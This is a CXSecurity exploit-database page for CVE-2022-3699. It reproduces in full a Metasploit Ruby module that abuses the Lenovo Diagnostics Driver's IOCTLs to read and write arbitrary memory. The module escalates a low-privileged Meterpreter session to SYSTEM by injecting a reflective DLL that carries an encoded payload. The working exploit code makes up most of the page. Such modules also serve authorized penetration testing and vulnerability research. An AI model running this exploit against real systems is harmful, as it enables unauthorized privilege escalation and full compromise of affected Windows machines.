---
title: Lenovo Diagnostics Driver Memory Access
url: https://cxsecurity.com/issue/WLB-2023020014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-07
fetch_date: 2025-10-04T05:48:44.319593
---

# Lenovo Diagnostics Driver Memory Access

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Lenovo Diagnostics Driver Memory Access** **2023.02.06**  Credit:  **[jheysel-r7](https://cxsecurity.com/author/jheysel-r7/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2022-3699](https://cxsecurity.com/cveshow/CVE-2022-3699/ "Click to see CVE-2022-3699")**  CWE: **[CWE-787](https://cxsecurity.com/cwe/CWE-787 "CWE-787")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = GoodRanking
include Msf::Exploit::Local::WindowsKernel
include Msf::Post::File
include Msf::Post::Windows::Priv
include Msf::Post::Windows::Process
include Msf::Post::Windows::ReflectiveDLLInjection
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
{
'Name' => 'Lenovo Diagnostics Driver IOCTL memmove',
'Description' => %q{
Incorrect access control for the Lenovo Diagnostics Driver allows a low-privileged user the ability to
issue device IOCTLs to perform arbitrary physical/virtual memory read/write.
},
'License' => MSF\_LICENSE,
'Author' => [
'alfarom256', # Original PoC
'jheysel-r7' # msf module
],
'Arch' => [ ARCH\_X64 ],
'Platform' => 'win',
'SessionTypes' => [ 'meterpreter' ],
'DefaultOptions' => {
'EXITFUNC' => 'thread'
},
'Targets' => [
[ 'Windows x64', { 'Arch' => ARCH\_X64 } ]
],
'References' => [
[ 'CVE', '2022-3699' ],
[ 'URL', 'https://github.com/alfarom256/CVE-2022-3699/' ]
],
'DisclosureDate' => '2022-11-09',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => []
},
'Compat' => {
'Meterpreter' => {
'Commands' => %w[
stdapi\_railgun\_api
]
}
}
}
)
)
end
def check
unless session.platform == 'windows'
# Non-Windows systems are definitely not affected.
return Exploit::CheckCode::Safe
end
handle = open\_device('\\\\.\\LenovoDiagnosticsDriver', 'FILE\_SHARE\_WRITE|FILE\_SHARE\_READ', 0, 'OPEN\_EXISTING')
if handle.nil?
return Exploit::CheckCode::Safe
end
session.railgun.kernel32.CloseHandle(handle)
CheckCode::Appears
end
def target\_compatible?
build\_num = sysinfo['OS'].match(/Build (\d+)/)[1].to\_i
vprint\_status("Windows Build Number = #{build\_num}")
return true if sysinfo['OS'] =~ /Windows 10/ && build\_num >= 14393 && build\_num <= 19045
return true if sysinfo['OS'] =~ /Windows 11/ && build\_num == 22000
return true if sysinfo['OS'] =~ /Windows 2016\+/ && build\_num >= 17763 && build\_num <= 20348
false
end
def exploit
if is\_system?
fail\_with(Failure::None, 'Session is already elevated')
end
# check that the target is a compatible version of Windows (since the offsets are hardcoded) before loading the RDLL
unless target\_compatible?
fail\_with(Failure::NoTarget, 'The exploit does not support this target')
end
if sysinfo['Architecture'] == ARCH\_X64 && session.arch == ARCH\_X86
fail\_with(Failure::NoTarget, 'Running against WOW64 is not supported')
elsif sysinfo['Architecture'] == ARCH\_X64 && target.arch.first == ARCH\_X86
fail\_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
elsif sysinfo['Architecture'] == ARCH\_X86 && target.arch.first == ARCH\_X64
fail\_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
end
encoded\_payload = payload.encoded
execute\_dll(
::File.join(Msf::Config.data\_directory, 'exploits', 'CVE-2022-3699', 'CVE-2022-3699.x64.dll'),
[encoded\_payload.length].pack('I<') + encoded\_payload
)
print\_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top